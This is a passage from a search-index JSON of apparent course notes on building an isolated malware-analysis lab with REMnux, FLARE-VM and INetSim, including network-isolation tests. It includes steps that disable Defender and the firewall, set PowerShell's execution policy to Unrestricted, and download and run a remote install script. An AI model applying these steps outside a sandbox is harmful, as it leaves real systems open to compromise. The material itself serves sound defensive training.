Testing","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course_Summary/#001_wireless_penetration_testing_overview","title":"001_Wireless_Penetration_Testing_Overview","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course_Summary/#002_wpa_ps2_exploit_walkthrough","title":"002_WPA_PS2_Exploit_Walkthrough","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course_Summary/#legal-documents-and-report-writing","title":"Legal Documents and Report Writing","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course_Summary/#001_common_legal_documents","title":"001_Common_Legal_Documents","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course_Summary/#002_pentest_report_writing","title":"002_Pentest_Report_Writing","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course_Summary/#003_reviewing_a_real_pentest_report","title":"003_Reviewing_a_Real_Pentest_Report","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Ethical_Hacking_-_The_Complete_Course_Summary/#career-advice","title":"Career Advice","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/","title":"Practical Malware Analysis and Triage","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#1-safety-always-building-your-malware-analysis-lab-malware-safety","title":"1. Safety Always! Building Your Malware Analysis Lab &amp; Malware Safety","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#virtualbox","title":"Virtualbox","text":"<p>Download VirtualBox Install VirtualBox on Mac Install VirtualBox on Linux</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#remnum","title":"REMnum","text":"<p>Download the VirtualBox OVA</p> <p>import into VirtualBox &gt; start &gt; take snapshot</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#download-install-windows-10","title":"Download &amp; Install Windows 10","text":"<p>Download WIndows 10 Enterprise</p> <p>After installing Windows &gt; VirtualBox &gt; Devices &gt; Insert guest additions cd image &gt; Install it &gt; Reboot</p> <p>Take a snapshot</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#flare-vm","title":"FLARE-VM","text":"<p>We will get quality of life and necessary applications installed.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#windows-terminal","title":"Windows Terminal","text":"<p>Download the VCLibs package. In a PowerShell window</p> <pre><code>wget - https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx -usebasicparsing -o VCLibs.appx\n</code></pre> <p>Download the Windows Terminal MSIX bundle from the provided link</p> <pre><code>wget https://github.com/microsoft/terminal/releases/download/v1.15.3465.0/Microsoft.WindowsTerminal_Win10_1.15.3465.0_8wekyb3d8bbwe.msixbundle -UseBasicParsing -o winterminal.msixbundle\n</code></pre> <p>In a PowerShell admin window, add the VCLibs package</p> <p><pre><code>Add-AppxPackage [C:\\path\\to\\downloaded\\VCLibs.appx]\n</code></pre> In a PowerShell admin window</p> <pre><code>Add-AppxPackage - [C:\\path\\to\\downloaded\\winterminal.msixbundle]\n</code></pre> <p></p> <ul> <li>notes <ul> <li>(Optional) Pin Windows Terminal to the task bar</li> <li>If above not working make sure Windows is updated build 1809 or - later, you can use https://github.com/microsoft/terminal</li> </ul> </li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#disable-proxy-auto-detect-setting","title":"Disable proxy auto detect setting","text":"<p>In the Windows search bar, search <code>proxy settings</code></p> <p>Switch \"Automatically detect settings\" button off</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#disable-tamper-protection","title":"Disable Tamper Protection","text":"<ul> <li>Search <code>Defender</code>, open Defender settings &gt; Home &gt; Virus &amp; threat - protection &gt; Virus &amp; threat protection settings</li> <li>set all - Defender Settings to off</li> </ul>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#disable-avdefender-in-gpo","title":"Disable AV/Defender in GPO","text":"<p>In Windows search bar, search <code>group policy</code></p> <p>In GPO, navigate to \u2192 Administrative Templates \u2192 Windows Components - \u2192 Microsoft Defender Antivirus \u2192 Enable \u201cTurn off Microsoft Defender - Antivirus\u201d</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#disable-windows-firewall","title":"Disable Windows Firewall","text":"<p>GPO \u2192 Administrative Templates \u2192 Network \u2192 Network Connections \u2192 - Windows Defender Firewall \u2192 Domain Profile \u2192 Disable  ``Protect All - Network Connections```</p> <p>Do the same but for the Standard profile</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#take-vm-snapshot","title":"TAKE VM SNAPSHOT!","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#download-and-install-flare-vm","title":"Download and install FLARE-VM","text":"<p>In PowerShell Admin prompt</p> <pre><code>(New-Object net.webclient).DownloadFile('https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1',\"$([Environment]::GetFolderPath(\"Desktop\"))\\install.ps1\")\n</code></pre> <p>Change directories to the Desktop</p> <pre><code>Unblock-File .\\install.ps1\nSet-ExecutionPolicy Unrestricted\n</code></pre> <p>Accept the prompt to set the ExecPol to unrestricted if one appears</p> <pre><code>.\\install.ps1 -customConfig https://raw.githubusercontent.com/HuskyHacks/PMAT-labs/main/config.xml\n</code></pre> <p>Follow the rest of the prompts (answer Y to all) and continue with the installation.</p> <p>When the installation is done, TAKE ANOTHER SNAPSHOT!</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#analysis-network-setup","title":"Analysis Network Setup","text":"<p>In Virtualbox &gt; Tools &gt; Network</p> <p></p> <p>Under Host-only Networks &gt; Create Make sure teh subnet is set different than your own home Network and enable DHCP Server</p> <p></p> <p>Now we need to the VMs settings then Network</p> <p>Make sure you only have one Adapter enabled. That one adapter should be configured for Host-only Adapter and select the Adapter name you created earlier</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#inetsim-setup","title":"INetSim Setup","text":"<p>INetSim Internet Simulator and Analysis</p> <p>to start INetSIm</p> <pre><code>inetsim\n</code></pre> <p></p> <p>We need to quit the inetsim and make some changes</p> <pre><code>sudo nano /etc/inetsim/inetsim.conf\n</code></pre> <p></p> <p>locate and uncomment dns service (remove the #)</p> <p></p> <p>removed the # for dns service</p> <p></p> <p>Now locate <code>service_bind_address</code></p> <p></p> <p>change it to <code>0.0.0.0</code></p> <p></p> <p>Now locate <code>dns_default_ip</code></p> <p></p> <p>uncomment it and change the ip address to the same ip of the Remnux box</p> <p></p> <p>If you don't know the ip then run 'ip a' in a separate terminal and check the ip address</p> <p></p> <p>Now we need to save the changes <code>CTRL + X</code> save changes</p> <p>Start <code>inetsim</code></p> <p></p> <p>To test this out open browser session to the Remnux ip address</p> <p></p> <p>Go to the adapter settings on the Windows machine and set the DNS to the Remnux IP</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#host-only-safety-internal-networks","title":"Host-only Safety &amp; Internal Networks","text":""},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#introduction","title":"Introduction","text":"<p>Safety is taught from the beginning of this course and underpins every single activity that we conduct. One of the most critical pieces of the malware analysis puzzle is the lab setup. Isolating a malware analysis lab is incredibly important to reduce the risk to your physical host and surrounding network.</p> <p>So far, we've learned how to create a malware analysis lab network that uses a Host-Only network adapter to facilitate communication between lab hosts. Over time, other PMAT students have approached me with a reasonable concern regarding the lab network setup. Their concern usually goes like this:</p> <p>If Host-Only mode allows a VM to route to the physical host in some circumstances, can it really be considered safe for malware analysis?</p> <p>I applaud my students for approaching me about this because it means they are thinking critically about safety during malware analysis. While we can never truly eliminate the risk incurred during malware analysis, we must make every effort to mitigate the risk as much as possible wherever it exists.</p> <p>In this section, I\u2019d like to cover some of the safety considerations for the Host-Only network setup to assuage these concerns. I\u2019d also like to walk you through an additional, optional lab network setup for those looking for an extra degree of security.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#host-only-safety","title":"Host-Only Safety","text":"<p>First thing\u2019s first. I\u2019d like to get this out of the way immediately:</p> <p>The PMAT course\u2019s Host-Only lab network setup, when followed to the letter, is safe, has been safe, and will always be safe for malware analysis during this course! There is no need to setup an Internal Network to complete the course safely. The malware in the course has been designed and/or chosen to be as safe as possible in tandem with this lab set up.</p> <p>In most circumstances, a Host-Only setup effectively mitigates the risk of a malware sample being able to route out to the greater internet to download second stages or call back to a C2. This comes standard with the design of a Host-Only network.</p> <p>Consider the following table of VirtualBox network configurations:</p> <p></p> <p>https://www.virtualbox.org/manual/ch06.html</p> <p>In Host-Only mode, a guest VM does not know and cannot see the outer LAN. That\u2019s good \u2705</p> <p>But it\u2019s the VM\u2192 Host and Host \u2192 VM communication capability represented in the first two columns of the table that tends to concern students. Let\u2019s examine how this functions and some of the mitigating factors at play.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#safety-test","title":"Safety Test","text":"<p>Assume that for the following section, I am using the FLAREVM host with a Host-Only network adapter with a configuration that mirrors the course\u2019s lab network setup configuration. FLAREVM is the host that is used to detonate malware in the course, so we need to make sure it\u2019s safe for our analysis efforts.</p> <p>Our first experiment is to start a listening socket in our FLAREVM machine and attempt to reach it with our physical host. For simplicity sake, I\u2019ll use port 80.</p> <p>On FLAREVM:</p> <pre><code>C:\\Users\\husky&gt;ncat -nvlp 80\nNcat: Version 5.59BETA1 ( http://nmap.org/ncat )\nNcat: Listening on 0.0.0.0:80\n</code></pre> <p>From my physical host:</p> <pre><code>PS C:\\Users\\Matt&gt; ncat -nv 10.0.0.4 80\nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Connected to 10.0.0.4:80.\nhello!\n</code></pre> <pre><code>C:\\Users\\husky&gt;ncat -nvlp 80\nNcat: Version 5.59BETA1 ( http://nmap.org/ncat )\nNcat: Listening on 0.0.0.0:80\nNcat: Connection from 10.0.0.1:1343.\nhello!\n</code></pre> <p>Just like the table depicts, we can route from our physical host to our guest VM.</p> <p>But now, let\u2019s attempt to do this in reverse. Note that I use a Windows OS for my physical host with a default set of host firewall configuration rules.</p> <p>On my physical host:</p> <pre><code>PS C:\\Users\\Matt&gt; ncat.exe -nvlp 80\nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::80\nNcat: Listening on 0.0.0.0:80\n</code></pre> <p>From FLAREVM, I can try to access my physical host through its Host-Only adapter IP address, which is 10.0.0.1:</p> <pre><code>C:\\Users\\husky&gt;ncat -nv 10.0.0.1 80\nNcat: Version 5.59BETA1 ( http://nmap.org/ncat )\nNcat: .\n\nPS C:\\Users\\Matt&gt; ncat.exe -nvlp 80\nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::80\nNcat: Listening on 0.0.0.0:80\n</code></pre> <p>No connection is established. We can repeat this with our physical host\u2019s LAN IP and the same thing happens. The Windows host firewall has prevented this from occurring. As long as the default firewall settings are configured, no connection will traverse from the guest VM to the host.</p> <p>So when we think about the risk displayed in the previous test, what do we see? Our physical host can route into our guest VM, but our guest VM cannot route to our physical host because it is blocked by the host firewall.</p> <p>Is there much risk in our physical host being able to initiate a connection and reach our guest VM? I would say no. Our physical host\u2019s hypervisor is how we interact with the guest VM, so this represents another way that the hypervisor host can access the guest. If the opposite were true and the guest VM could initiate a connection to our physical host, it would be riskier.</p> <p>If we imagine any malware sample that detonates in FLAREVM and tries to traverse out to our physical host, this traffic will now either:</p> <pre><code>be handled and routed to INetSim,\nor, be dropped by the physical host\u2019s firewall.\n</code></pre>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#nix-and-macos","title":"*nix and MacOS","text":"<p>Now, that works well for Windows hosts, but what about a physical host running nix or MacOS? While it\u2019s true that these OS do not come standard with a host firewall, the malware in the PMAT course is not designed to be compatible with nix operating systems. The one exception here is the Android malware sample, but this sample is only examined with static analysis methodology, meaning it is never executed. There are no malware propagation mechanisms in the malware in this course that can infect a *nix/MacOS host.</p> <p>Additionally, nix and MacOS can use the venerable iptables utility to drop traffic that is inbound from the guest VMs. iptables is built into the nix OS and serves as a host firewall:</p> <pre><code># iptables -A INPUT -s [IP ADDRESS] -j DROP\n</code></pre> <p>If you are using nix/MacOS for your physical host\u2019s OS, it may be a good idea (though is not necessary for this course) to implement iptables rules for future analysis, especially if you want to analyze malware that is built for nix. Please see the man page for iptables and this site for more information.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#internal-networks","title":"Internal Networks","text":"<p>For the final part of this section, I\u2019d like to offer the steps for how to make an Internal Network for our malware analysis lab. This is completely optional and you cannot have an Internal Network and a Host-Only network configured at the same time, so please pick one to configure.</p> <p>Again, Host-Only is sufficient for this course. The Internal Network provides an additional level of safety that removes the reliance on a host firewall to protect our physical host, so if you are more comfortable implementing it, please feel free to do so.</p> <p>I want to teach this because it is likely that, during your lucrative career as the world\u2019s preeminent malware analyst, you\u2019ll be faced with a situation where the risk calculus is such that an Internal Network is the only safe option. In truth, all of my malware analysis work is done with VMworkstation Pro and an Internal Network. While VMworkstation Pro is not available for free, the VirtualBox Internal Network is now sufficiently stable and usable that we can use it in the course.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#setting-up-remnux","title":"Setting Up REMnux","text":"<p>We need to create an Internal Network and associate both VMs to it. We\u2019ll start with REMnux. Perform the following steps to do so. - Right-click on the REMnux VM and select Settings - Click on Network - In the Attached To dropdown menu, select Internal Network - In VirtualBox, Internal Networks are associated by name. Add a name to the new Internal Network, like \u201cpmat-internalnet\u201d - Click the drop down arrow next to Advanced to expand the advanced settings - In the Promiscuous Mode drop down menu, select \u201cAllow VMs\u201d</p> <p>Your settings should now look like this:</p> <p></p> <p>Click OK. Then, power on the REMnux guest host by clicking the Start button.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#remnux-static-ip-assignment","title":"REMnux Static IP Assignment","text":"<p>There is no DHCP server in the Internal Network, so we need to manually define a static IP address for the REMnux host. We will use the netplan utility to do so. The netplan utility uses a YAML config file to control the host\u2019s adapter settings. This YAML config file lives in /etc/netplan/</p> <p>Open the netplan conf file in nano with sudo:</p> <pre><code>remnux@remnux:~$ sudo nano /etc/netplan/01-netcfg.yaml\n</code></pre> <pre><code># This file describes the network interfaces available on your system\n# For more information, see netplan(5).\nnetwork:\n  version: 2\n  renderer: networkd\n  ethernets:\n    enp0s3:\n      dhcp4: yes\n</code></pre> <p>We want to remove this from DHCP and assign all network information statically. YAML syntax requires specific code indentation to be processed correctly. Please pay attention to the amount of spaces for each YAML object.</p> <p>Change <code>dhcpv4</code> to <code>no</code>, add the <code>addresses</code> and <code>gateway4</code> objects, and configure them with the following values:</p> <pre><code>yaml\n# This file describes the network interfaces available on your system\n# For more information, see netplan(5).\nnetwork:\n  version: 2\n  renderer: networkd\nethernets:\n    enp0s3:\n     dhcp4: no\n     addresses: [10.0.0.3/24]\n     gateway4: 10.0.0.1\n</code></pre> <p>Now, we apply the configuration:</p> <pre><code>remnux@remnux:~$ sudo netplan apply\nremnux@remnux:~$\n</code></pre> <p>If no output returns after the netplan apply command, the YAML file is formatted correctly and has been processed.</p> <p>If you get the following error:</p> <pre><code>remnux@remnux:~$ sudo netplan apply\n/etc/netplan/01-netcfg.yaml:10:10: Invalid YAML: inconsistent indentation\n</code></pre> <p>\u2026 or:</p> <pre><code>Invalid YAML at //etc/netplan/01-netcfg.yaml line 7 column 6: did not find expected key\n</code></pre> <p>\u2026 that means your YAML syntax is off somewhere. It will show you the line that you need to fix.</p> <p>We can now inspect the adapter settings on REMnux:</p> <pre><code>remnux@remnux:~$ ip -br -c a\nlo               UNKNOWN        127.0.0.1/8 ::1/128 \nenp0s3           UP             10.0.0.3/24 fe80::a00:27ff:feef:67e4/64\n</code></pre>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#setting-up-flarevm","title":"Setting Up FLAREVM","text":"<p>FLAREVM is, believe it or not, a bit more straightforward than REMnux for this setup. - Right-click on the FLAREVM host and select Settings - Click on Network - In the Attached To dropdown menu, select Internal Network - Associate FLAREVM to the same Internal Network that we made earlier in the setup for REMnux by selecting it from the Name dropdown: \u201cpmat-internalnet\u201d - Click the drop down arrow next to Advanced to expand the advanced settings - In the Promiscuous Mode drop down menu, select \u201cAllow VMs\u201d</p> <p>Your settings should now look like this:</p> <p></p> <p>Click OK. Then, power on the FLAREVM guest host by clicking the Start button.</p> <p>Once you have logged in and are at the FLAREVM desktop, go to the Windows button and enter <code>View Network Connections</code> in the search to get to the Network Connection Adapter settings.</p> <p>Two adapters are present: an <code>Ethernet Adapter</code> and the <code>Npcap Loopback Adapter</code>. Right click on the Ethernet adapter and select <code>Properties \u2192 IPv4 Properties</code>.</p> <p>We will now statically define our IPv4 settings to mirror the Host-Only setup. This means that at the end of the day, we want: - The IPv4 address of FLARE to be set to something. It doesn\u2019t matter what it\u2019s set to as long as it\u2019s a valid address in the <code>10.0.0.0/24</code> network and we keep track of it. - The Subnet Mask to configure a <code>/24</code> network. - Our Default Gateway to be the REMnux host so we can make use of INetSim. - Our DNS server to be the REMnux host so we can make use of INetSim.</p> <p>The correct settings look something like this:</p> <p> </p> <p>Once this looks good, select OK and then select OK in the adapter settings window.</p> <p>Now, examine the IP settings in a cmd prompt:</p> <pre><code>C:\\Users\\husky&gt;ipconfig /all\n\nWindows IP Configuration\n\n   Host Name . . . . . . . . . . . . : DESKTOP-M87PSAK\n   Primary Dns Suffix  . . . . . . . :\n   Node Type . . . . . . . . . . . . : Hybrid\n   IP Routing Enabled. . . . . . . . : No\n   WINS Proxy Enabled. . . . . . . . : No\n\nEthernet adapter Ethernet:\n\n   Connection-specific DNS Suffix  . :\n   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter\n   Physical Address. . . . . . . . . : 08-00-27-55-06-07\n   DHCP Enabled. . . . . . . . . . . : No\n   Autoconfiguration Enabled . . . . : Yes\n   Link-local IPv6 Address . . . . . : fe80::f4fb:f210:ea5a:478f%4(Preferred)\n   IPv4 Address. . . . . . . . . . . : 10.0.0.4(Preferred)\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 10.0.0.3\n   DHCPv6 IAID . . . . . . . . . . . : 101187623\n   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-28-B4-6C-F2-08-00-27-55-06-07\n   DNS Servers . . . . . . . . . . . : 10.0.0.3\n   NetBIOS over Tcpip. . . . . . . . : Enabled\n</code></pre> <p>Note the entries for the IP address, subnet mask, default gateway, and DNS server.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#testing-troubleshooting","title":"Testing &amp; Troubleshooting","text":"<p>Now, let\u2019s test our network. Ideally, our network now facilitates communication between FLAREVM and REMnux while also denying traffic to our physical host and beyond. And unlike a Host-Only network, we don\u2019t need to rely on a host firewall to drop traffic heading for our physical host.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#test-connectivity-between-vms","title":"Test Connectivity Between VMs","text":"<p>The old ping test. Ping the other VM.</p> <p>On FLAREVM:</p> <pre><code>C:\\Users\\husky&gt;ping -n 2 10.0.0.3\n\nPinging 10.0.0.3 with 32 bytes of data:\nReply from 10.0.0.3: bytes=32 time&lt;1ms TTL=64\nReply from 10.0.0.3: bytes=32 time&lt;1ms TTL=64\n\nPing statistics for 10.0.0.3:\n    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n</code></pre> <p>On REMnux:</p> <pre><code>remnux@remnux:~$ ping -c 2 10.0.0.4\nPING 10.0.0.4 (10.0.0.4) 56(84) bytes of data.\n64 bytes from 10.0.0.4: icmp_seq=1 ttl=128 time=0.308 ms\n64 bytes from 10.0.0.4: icmp_seq=2 ttl=128 time=0.321 ms\n\n--- 10.0.0.4 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1020ms\nrtt min/avg/max/mdev = 0.308/0.314/0.321/0.006 ms\n</code></pre>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#test-outbound-connections","title":"Test Outbound Connections","text":"<p>Ensure that our Internal Network is truly isolated with a few tests. Each of these tests should fail which indicates that our network is not routable to our physical host and beyond.</p> <p>On REMnux:</p> <pre><code>remnux@remnux:~$ ping -c 2 8.8.8.8\nPING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\nFrom 10.0.0.3 icmp_seq=1 Destination Host Unreachable\nFrom 10.0.0.3 icmp_seq=2 Destination Host Unreachable\n\n--- 8.8.8.8 ping statistics ---\n2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 1026ms\npipe 2\n\nremnux@remnux:~$ nslookup google.com\nServer:     127.0.0.53\nAddress:    127.0.0.53#53\n\n** server can't find google.com: SERVFAIL\n\nremnux@remnux:~$ ping -c 2 [your physical host's IP address/Wifi address]\nPING x.x.x.x (x.x.x.x) 56(84) bytes of data.\nFrom 10.0.0.3 icmp_seq=1 Destination Host Unreachable\nFrom 10.0.0.3 icmp_seq=2 Destination Host Unreachable\n\n--- x.x.x.x ping statistics ---\n2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 1001ms\npipe 2\n</code></pre> <p>On FLAREVM, repeat the previous steps.</p> <pre><code>C:\\Users\\husky&gt;ping -n 2 8.8.8.8\n\nPinging 8.8.8.8 with 32 bytes of data:\nRequest timed out.\nRequest timed out.\n\nPing statistics for 8.8.8.8:\n    Packets: Sent = 2, Received = 0, Lost = 2 (100% loss),\n\nC:\\Users\\husky&gt;ping -n 2 google.com\nPing request could not find host google.com. Please check the name and try again.\n\nC:\\Users\\husky&gt;ping -n 2 [your physical host's IP address/Wifi address]\n\nPinging x.x.x.x with 32 bytes of data:\nRequest timed out.\nRequest timed out.\n\nPing statistics for x.x.x.x:\n    Packets: Sent = 2, Received = 0, Lost = 2 (100% loss),\n</code></pre> <p>Under certain circumstances, you may see a ping response when pinging a DNS record. Depending on if you have been using the lab and INetSim, this response may be coming from the INetSim DNS resolver. Stopping INetSim, flushing the DNS cache on FLAREVM, and attempting to ping again should fix this:</p> <pre><code>C:\\Users\\husky&gt;ping -n 2 google.com\n\nPinging google.com [10.0.0.3] with 32 bytes of data:\nReply from 10.0.0.3: bytes=32 time&lt;1ms TTL=64\nReply from 10.0.0.3: bytes=32 time&lt;1ms TTL=64\n\nPing statistics for 10.0.0.3:\n    Packets: Sent = 2, Received = 2, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\n</code></pre> <p>[On REMnux, stop INetSim wih Ctl+C]</p> <pre><code>C:\\Users\\husky&gt;ipconfig /flushdns\n\nWindows IP Configuration\n\nSuccessfully flushed the DNS Resolver Cache.\n\nC:\\Users\\husky&gt;ping -n 2 google.com\nPing request could not find host google.com. Please check the name and try again\n</code></pre>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#test-inetsim","title":"Test INetSim","text":"<p>Use the configuration details from the INetSim setup from PMAT and test to make sure FLAREVM can still access arbitrary DNS records.</p> <p>Start INetSim on REMnux:</p> <pre><code>remnux@remnux:~$ inetsim\nINetSim 1.3.2 (2020-05-19) by Matthias Eckert &amp; Thomas Hungenberg\nUsing log directory:      /var/log/inetsim/\nUsing data directory:     /var/lib/inetsim/\nUsing report directory:   /var/log/inetsim/report/\nUsing configuration file: /etc/inetsim/inetsim.conf\nParsing configuration file.\nConfiguration file parsed successfully.\n=== INetSim main process started (PID 1902) ===\nSession ID:     1902\nListening on:   10.0.0.3\nReal Date/Time: 2022-09-12 06:48:40\nFake Date/Time: 2022-09-12 06:48:40 (Delta: 0 seconds)\n Forking services...\n  * dns_53_tcp_udp - started (PID 1906)\n  * smtp_25_tcp - started (PID 1909)\n  * pop3_110_tcp - started (PID 1911)\n  * pop3s_995_tcp - started (PID 1912)\n  * smtps_465_tcp - started (PID 1910)\n  * ftp_21_tcp - started (PID 1913)\n  * https_443_tcp - started (PID 1908)\n  * http_80_tcp - started (PID 1907)\n  * ftps_990_tcp - started (PID 1914)\n done.\nSimulation running.\n</code></pre> <p>Use nslookup from FLAREVM for an arbitrary DNS record:</p> <pre><code>C:\\Users\\husky&gt;nslookup asdasdasd.com\nServer:  www.inetsim.org\nAddress:  10.0.0.3\n\nName:    asdasdasd.com\nAddress:  10.0.0.3\n</code></pre> <p>Use a browser to browse to an arbitrary site name:</p> <p></p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#conclusion","title":"Conclusion","text":"<p>That concludes this section on Host-Only network safety and creating an Internal Network for our malware analysis lab. You have learned more about the safety considerations of the Host-Only network setup and how to make an Internal Network to apply a greater degree of safety to the lab setup.</p> <p>Remember, both of these lab network setups are sufficiently safe for this course. Please consider each type of network and what your needs are as a malware analyst for analysis beyond the PMAT course.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#lab-vm-repo-link","title":"Lab VM Repo Link","text":"<p>Update 11/13/2021</p> <p>Hello!</p> <p>A few students have approached me about their lab installations and some issues they have encountered. I'd like to explain a little about my thought process for the lab in this course and offer a solution for those having issues creating the lab.</p> <p>In Instructional Design theory, there is a concept called \"cognitive load.\" Basically, the instructor of a course should do as much as possible to limit the number of extra activities a student completes to learn a concept. I take a lot of care to make sure I'm never overloading my students with meaningless activities!</p> <p>In a lot of cybersecurity training courses, there is a lot of lab setup before you get to do the fun stuff. In most of those other courses, the lab is just a lot of work upfront until you can learn the concepts taught in the course.</p> <p>But with malware analysis, creating a lab is a skill in and of itself. It is incredibly important to learn how to set up and maintain a lab during analysis because the safety of your data is at stake!</p> <p>So I ask you, please put an honest effort into making sure you set up your lab correctly so that you are safe. This skill is critical for any malware analyst.</p> <p>That having been said, if you are having serious issues with your lab build and can't seem to get it to work (or need a clean state to revert back to), please feel free to use the VM images located at the GDrive link below. It has both FLAREVM and REMnux in clean, known-good states and should work for the remainder of the course.</p> <p>Link: https://drive.google.com/drive/folders/11-d9MfCbitiyt4OmT-oP-vSeR9viUuRn</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#rapid-deployable-cloud-malware-analysis-lab-setup","title":"Rapid-deployable Cloud Malware Analysis Lab Setup","text":"<p>I don't give a rats behind about this atm.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#introduction_1","title":"Introduction","text":"<p>This section is optional. If you already have your local lab environment set up and have no interest in building a cloud malware analysis lab, please feel free to skip this section.</p> <p>For those of you who are looking for a cloud lab setup, this section is for you!</p> <p>There are many reasons why a cloud lab set up can be ideal for malware analysis. It transfers the risk of malware analysis to ephemeral assets. It keeps your own physical host safe. And it can be a great option for analysts who do not have the compute power necessary to run several local VMs.</p> <p>The following section outlines how to set up a rapid-deployable cloud malware analysis lab in Amazon Web Services (AWS). We will walk through how to leverage Terraform to make the process of provisioning and tearing down the lab as easy as running a set of simple commands. By the end of this section, you will have the capability to spin up and tear down cloud lab hosts within minutes.</p> <p>But first, a few warnings.</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#warning-you-need-permission-to-do-this","title":"WARNING: You need permission to do this","text":"<p>AWS permits malware analysis on provisioned instances on a case-by-case basis. To engage in malware analysis on AWS infrastructure, you must fill out and submit a Simulated Events form for review. Fill the form out to the best of your ability and submit it prior to analyzing malware. The form can be found at the link below (you must be logged in to view this form)</p> <p>https://console.aws.amazon.com/support/contacts#/simulated-events</p>"},{"location":"Knowledge_Base/Cyber_Journey/TCM_Security/Practical_Malware_Analysis_and_Triage/#warning-some-assembly-required","title":"WARNING: Some Assembly Required","text":"<p>Provisioning cloud resources can be tricky if you are not familiar with the process. I will do my best to lay out a crash course in how to work within AWS, but unfortunately the topic is too grand to do it justice in a single section of a course. This is not an AWS course, after all!</p> <p>The goal for this section is not to give you a comprehensive understanding of how to provision cloud assets. The goal is to get to the point where we can lean on Terraform to do most of the heavy lifting for us.</p> <p>If you are choosing to build a cloud lab environment, I assume that you are either already familiar with AWS or you are confident enough in your abilities to troubleshoot issues on your own. The potential for issues to arise during this section of the course is far too high and I can\u2019t help everyone with every issue, every time.</p> <p>Please anticipate that you may need to troubleshoot your own set up and research the specifics of working in AWS if you elect to use a cloud lab. I will do my best to assist but I can't fix 